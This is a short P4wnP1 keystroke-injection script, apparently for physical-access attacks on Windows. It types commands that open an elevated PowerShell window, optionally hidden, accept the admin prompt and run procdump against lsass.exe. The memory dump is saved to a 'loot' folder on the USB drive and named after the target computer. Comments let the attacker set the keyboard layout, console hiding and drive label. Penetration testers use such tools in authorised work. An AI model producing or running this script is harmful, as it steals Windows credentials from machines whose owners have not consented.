//You need HID Keyboard and USB Mass Storage enabled under USB SETTINGS

layout('gb-2');		//Keyboard layout
hide=false; 			//Set to true to hide the console window on the target
exit=false;				//Set to true to exit the console once finished

typingSpeed(0,0);	//Typing as fast as possible
delay(1000)       //Apparently this is neccessary. Without, for some reason, when lauching from trigger it skips GUI R
press('GUI r');
delay(700);
if (hide) type('powershell -w h -NoP -NonI'); else type('powershell'); //Hide the console if chosen to do so
press('LEFT_CTRL LEFT_SHIFT ENTER'); //Shortcut to elevate
delay(2500);
press('LEFT ENTER'); //Confirm admin pop up
delay(3000);
type('$usbPath =((gwmi win32_volume -f "label=""P4WNP1""").Name)\n');	 //Replace 'P4WNP1' with your drive name
delay(100);
type('cd $usbPath\\tools\n'); //Move to tools directory
type('.\\procdump.exe -ma -accepteula lsass.exe $usbPath\\loot\\$env:COMPUTERNAME-lsass\n')
//Use procdump.exe from tools directory to dump lsass, output saved in loot directory and prepended with computer's name.
if (exit) { type('exit\n'); } //Exit the console if chosen to do so
